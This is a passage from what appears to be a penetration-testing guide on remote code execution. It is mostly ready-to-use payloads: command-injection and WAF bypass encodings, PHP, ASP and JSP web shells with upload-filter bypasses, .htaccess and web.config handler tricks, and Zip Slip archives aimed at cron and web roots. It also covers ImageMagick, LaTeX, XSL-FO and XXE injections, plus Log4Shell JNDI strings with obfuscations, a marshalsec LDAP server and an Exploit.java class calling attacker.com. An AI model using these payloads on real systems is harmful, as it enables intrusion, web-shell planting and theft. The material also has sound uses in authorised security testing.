#### Bypass Techniques

**Blacklist Bypasses:**

```bash
# Case variation
WhOaMi
wH%6f%61%6Di

# Encoding
wh\u006fami
wh\x6fami
echo "d2hvYW1p" | base64 -d | sh

# Line continuation
wh\
oami

# Comments (bash)
wh#comment
oami

# Null byte (legacy)
whoami%00.jpg
```

**WAF Bypasses:**

```bash
# Unicode/encoding
wh\u006fami

# Hex encoding
\x77\x68\x6f\x61\x6d\x69

# Concatenation
'wh'+'oami'
"wh"+"oami"

# Variable expansion
a=w;b=hoami;$a$b
```

### 4. Confirm the Vulnerability

Execute harmless commands to prove RCE without causing damage:

```bash
# Safe verification commands
whoami
id
pwd
hostname
uname -a
cat /etc/issue
systeminfo (Windows)

# Create proof file
echo "pwned_by_researcher" > /tmp/proof.txt

# Time-based confirmation
sleep 10 && curl http://attacker.com/confirmed
```

**Practical Tactics:**

- Use time-based payloads for blind cases; confirm via differential latency (baseline vs payload response time)
- Use OAST (Burp Collaborator, Interactsh) to detect out-of-band DNS/HTTP callbacks
- For deserialization, try signed/unsigned object tampering and gadget canaries
- For uploads, verify server-side processing paths (thumbnails, metadata extraction, AV scanning windows)
- Test multiple injection points in parallel; backend queue processing may delay execution
- Monitor server-side logs if accessible (error logs often reveal stack traces)

## Vulnerabilities

### File Upload → RCE Chains

#### 1. Web Shell Upload

**PHP Web Shells:**

```php
# Minimal shell
<?php system($_GET['c']); ?>

# Bypass extension filters
shell.php.jpg
shell.php%00.jpg     # Null byte (PHP <5.3)
shell.php%0a.jpg     # Newline
shell.php.....       # Multiple dots
shell.pHp            # Case variation
shell.php%20         # Trailing space
shell.php::$DATA     # Windows NTFS ADS
shell.php/           # Trailing slash (IIS)

# Content-Type manipulation
Content-Type: image/jpeg
Content-Disposition: form-data; name="file"; filename="shell.php.jpg"

# Polyglot files (valid image + PHP)
GIF89a<?php system($_GET['c']); ?>
```

**ASP/ASPX Shells:**

```asp
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% Process.Start("cmd.exe", "/c " + Request["c"]); %>
```

**JSP Shells:**

```jsp
<% Runtime.getRuntime().exec(request.getParameter("c")); %>
```

#### 2. .htaccess / web.config Injection

**.htaccess to enable PHP in images:**

```apache
AddType application/x-httpd-php .jpg
AddHandler application/x-httpd-php .jpg

# Alternative
<FilesMatch "\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>
```

**web.config to enable ASP in images:**

```xml
<configuration>
  <system.webServer>
    <handlers>
      <add name="jpg" path="*.jpg" verb="*" type="System.Web.UI.PageHandlerFactory" />
    </handlers>
  </system.webServer>
</configuration>
```

#### 3. Archive Extraction (Zip Slip - CVE-2018-1002200)

```bash
# Create malicious zip with path traversal
ln -s ../../../../../../../etc/cron.d/evil evil.txt
zip --symlinks evil.zip evil.txt

# Or craft manually with path traversal
evil/
  ../../../../var/www/html/shell.php
  ../../../../etc/cron.d/backdoor
```

**Testing:**

- Upload zip/tar containing paths with `../`
- Symlink to sensitive locations
- Overwrite cron jobs, SSH keys, web roots

#### 4. ImageMagick Exploits

**ImageTragick (CVE-2016-3714):**

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.com/shell.jpg"|whoami")'
pop graphic-context
```

**Modern ImageMagick RCE (CVE-2022-44268):**

```bash
# Arbitrary file read
convert -size 1x1 xc:red -set "profile:1" "/etc/passwd" exploit.png

# Exploitation
convert exploit.png output.png
identify -verbose output.png | grep "Raw profile type"
```

**Other ImageMagick vectors:**

- MSL (Magick Scripting Language) injection
- Label injection for RCE
- SVG with embedded scripts

#### 5. PDF Processing RCE

**PDF with JavaScript:**

```javascript
app.alert({ cMsg: "XSS", cTitle: "XSS" });

// File system access (if enabled)
this.exportDataObject({ cName: "test", nLaunch: 2 });
```

**LaTeX Injection:**

```latex
\documentclass{article}
\immediate\write18{whoami}
\begin{document}
Hello World
\end{document}

# Alternative
\input{|"whoami"}
```

**XSL-FO Injection (Apache FOP):**

```xml
<fo:instream-foreign-object>
  <svg:svg>
    <svg:script>java.lang.Runtime.getRuntime().exec("whoami")</svg:script>
  </svg:svg>
</fo:instream-foreign-object>
```

#### 6. Office Document Processing

**XXE in DOCX/XLSX:**

```xml
# Extract document1.xml from DOCX
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<document>&xxe;</document>
```

**Macro-enabled Documents:**

- DOCM, XLSM, PPTM files with VBA macros
- Excel 4.0 macros (XLM) bypass modern protections
- DDE (Dynamic Data Exchange) injection

**LibreOffice/OpenOffice Exploits:**

- CVE-2023-2255: Remote code execution via crafted documents
- Python macro execution in LibreOffice

### Log4Shell (CVE-2021-44228)

**Basic Payloads:**

```bash
${jndi:ldap://attacker.com/a}
${jndi:rmi://attacker.com/a}
${jndi:dns://attacker.com/a}

# Common injection points
User-Agent: ${jndi:ldap://attacker.com/a}
X-Api-Version: ${jndi:ldap://attacker.com/a}
Referer: ${jndi:ldap://attacker.com/a}
```

**Obfuscation Bypasses:**

```bash
# Lowercase/uppercase
${${lower:j}ndi:ldap://attacker.com/a}
${${upper:j}ndi:ldap://attacker.com/a}

# Environment variables
${j${env:NOTHING:-n}di:ldap://attacker.com/a}

# Nested lookups
${jnd${sys:java.version:-i}:ldap://attacker.com/a}

# Multiple levels
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
```

**Setup LDAP server for exploitation:**

```bash
# Using marshalsec
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit" 1389

# Exploit.java - compile and host
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("curl http://attacker.com/pwned");
        } catch (Exception e) {}
    }
}
```

